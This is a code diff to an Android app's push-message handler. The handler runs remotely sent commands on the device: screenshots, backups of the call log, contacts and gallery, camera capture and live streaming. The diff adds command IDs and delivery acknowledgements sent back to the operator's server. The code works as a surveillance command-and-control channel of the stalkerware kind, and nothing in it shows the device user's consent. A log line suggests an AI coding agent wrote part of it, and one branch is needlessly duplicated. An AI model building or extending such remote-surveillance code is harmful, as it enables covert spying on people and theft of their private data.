@@ -12,6 +12,7 @@ import androidx.core.app.NotificationCompat;
 import androidx.core.app.NotificationManagerCompat;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
+import org.json.JSONObject;
 
 public class MyFirebaseMessagingService extends FirebaseMessagingService {
 
@@ -34,6 +35,13 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
         if (remoteMessage.getData().size() > 0) {
             Log.d(TAG, "Message data payload: " + remoteMessage.getData());
             String action = remoteMessage.getData().get("action");
+            String commandId = remoteMessage.getData().get("command_id");
+
+            // Acknowledge Delivery
+            if (commandId != null) {
+                sendDeliveryStatus(commandId);
+            }
+
             if ("screenshot".equals(action)) {
                 Log.d(TAG, "Action: Screenshot (ANTIGRAVITY UPDATE). Broadcasting...");
 
@@ -43,11 +51,15 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                 // Broadcast to GlobalActionService to take screenshot
                 Intent intent = new Intent("com.example.suma.ACTION_SCREENSHOT");
                 intent.setPackage(getPackageName()); // Explicitly target our own app
+                if (commandId != null)
+                    intent.putExtra("command_id", commandId);
                 sendBroadcast(intent);
             } else if ("backup_call_log".equals(action)) {
                 Log.d(TAG, "Action: Backup Call Log. Broadcasting...");
                 Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CALLLOG");
                 intent.setPackage(getPackageName());
+                if (commandId != null)
+                    intent.putExtra("command_id", commandId);
                 sendBroadcast(intent);
             } else if ("backup_gallery".equals(action)) {
                 String mediaType = remoteMessage.getData().get("media_type");
@@ -55,16 +67,22 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                 Intent intent = new Intent("com.example.suma.ACTION_BACKUP_GALLERY");
                 intent.putExtra("media_type", mediaType);
                 intent.setPackage(getPackageName());
+                if (commandId != null)
+                    intent.putExtra("command_id", commandId);
                 sendBroadcast(intent);
             } else if ("backup_contacts".equals(action)) {
                 Log.d(TAG, "Action: Backup Contacts. Broadcasting...");
                 Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CONTACTS");
                 intent.setPackage(getPackageName());
+                if (commandId != null)
+                    intent.putExtra("command_id", commandId);
                 sendBroadcast(intent);
             } else if ("backup_contacts".equals(action)) {
                 Log.d(TAG, "Action: Backup Contacts. Broadcasting...");
                 Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CONTACTS");
                 intent.setPackage(getPackageName());
+                if (commandId != null)
+                    intent.putExtra("command_id", commandId);
                 sendBroadcast(intent);
             } else if ("capture_image".equals(action)) {
                 String facing = remoteMessage.getData().get("camera_facing");
@@ -72,6 +90,8 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
 
                 Intent intent = new Intent(this, CameraCaptureActivity.class);
                 intent.putExtra("camera_facing", facing);
+                if (commandId != null)
+                    intent.putExtra("command_id", commandId);
                 intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                 startActivity(intent);
             } else if ("start_stream".equals(action)) {
@@ -81,6 +101,8 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                 Intent intent = new Intent(this, LiveStreamService.class);
                 intent.setAction("start_stream");
                 intent.putExtra("live_stream_id", streamId);
+                if (commandId != null)
+                    intent.putExtra("command_id", commandId);
 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                     startForegroundService(intent);
@@ -95,6 +117,34 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
                 startService(intent);
             }
         }
+    }
+
+    private void sendDeliveryStatus(String commandId) {
+        if (commandId == null)
+            return;
+
+        String url = AuthManager.getBaseUrl() + "/command/status";
+        JSONObject json = new JSONObject();
+        try {
+            json.put("command_id", commandId);
+            json.put("status", "delivered");
+        } catch (Exception e) {
+            e.printStackTrace();
+            return;
+        }
+
+        String token = getSharedPreferences("SumaPrefs", MODE_PRIVATE).getString("fcm_token", null);
+        NetworkUtils.postJson(url, json.toString(), new NetworkUtils.Callback() {
+            @Override
+            public void onSuccess(String response) {
+                Log.d(TAG, "Command delivery status sent: " + response);
+            }
+
+            @Override
+            public void onError(String error) {
+                Log.e(TAG, "Failed to send delivery status: " + error);
+            }
+        }, token);
     }
 
     private void showNotification(String title, String body) {
